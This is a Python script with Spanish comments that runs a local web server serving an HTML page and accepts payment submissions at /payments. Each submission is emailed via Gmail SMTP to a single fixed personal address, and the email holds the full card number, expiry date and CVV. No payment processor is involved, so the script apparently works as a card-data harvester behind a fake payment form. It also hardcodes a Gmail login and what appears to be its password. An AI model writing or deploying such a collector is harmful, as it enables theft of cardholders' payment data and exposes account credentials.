import json
import os
from email.message import EmailMessage
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
import smtplib

# --- 1. CONFIGURACIÓN DEL EMISOR (Quien envía) ---
CORREO_EMISOR = "adjd6026@gmail.com"
CONTRASENA = "DEMONIO_12"  # Obligatoria por seguridad de Gmail

# --- 2. CONFIGURACIÓN DEL DESTINATARIO (Quien recibe) ---
UNICO_DESTINATARIO = "rafael.el.ra08@gmail.com"

HTML_FILE = "codigo html.html"
HOST = "127.0.0.1"
PORT = 8000


def enviar_correo_pago(datos_pago):
    msg = EmailMessage()
    msg['Subject'] = 'Pago recibido - Detalles de la transacción'
    msg['From'] = CORREO_EMISOR
    msg['To'] = UNICO_DESTINATARIO

    contenido = [
        'Se ha recibido un pago con los siguientes datos:',
        f"Método: {datos_pago.get('method', 'N/A')}",
        f"Monto: {datos_pago.get('amount', 'N/A')}",
        f"Tarjeta / Identificador: {datos_pago.get('maskedCard', 'N/A')}",
        f"Número de tarjeta (sin espacios): {datos_pago.get('cardNumber', 'N/A')}",
        f"Expiración: {datos_pago.get('expiry', 'N/A')}",
        f"CVV: {datos_pago.get('cvv', 'N/A')}",
        '',
        'Enviado automáticamente desde la aplicación local.'
    ]

    msg.set_content('\n'.join(contenido))

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(CORREO_EMISOR, CONTRASENA)
        smtp.send_message(msg)


class PaymentRequestHandler(SimpleHTTPRequestHandler):
    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET,POST,OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.end_headers()

    def do_GET(self):
        if self.path in ('/', '/index.html'):
            self.path = f'/{HTML_FILE}'
        return super().do_GET()

    def do_POST(self):
        if self.path != '/payments':
            self.send_error(404, 'No encontrado')
            return

        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode('utf-8')

        try:
            datos = json.loads(body)
        except json.JSONDecodeError:
            self.send_json_response({'success': False, 'error': 'JSON inválido'}, status=400)
            return

        try:
            enviar_correo_pago(datos)
            self.send_json_response({'success': True, 'message': 'Correo enviado correctamente'})
        except Exception as e:
            self.send_json_response({'success': False, 'error': str(e)}, status=500)

    def send_json_response(self, data, status=200):
        encoded = json.dumps(data).encode('utf-8')
        self.send_response(status)
        self.send_header('Content-Type', 'application/json; charset=utf-8')
        self.send_header('Content-Length', str(len(encoded)))
        self.end_headers()
        self.wfile.write(encoded)


if __name__ == '__main__':
    current_dir = os.path.dirname(os.path.abspath(__file__))
    os.chdir(current_dir)

    server_address = (HOST, PORT)
    httpd = ThreadingHTTPServer(server_address, PaymentRequestHandler)

    print(f"Servidor iniciado en http://{HOST}:{PORT}")
    print(f"Abre el archivo {HTML_FILE} directamente o usa el navegador en http://{HOST}:{PORT}")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('\nServidor detenido por el usuario')
        httpd.server_close()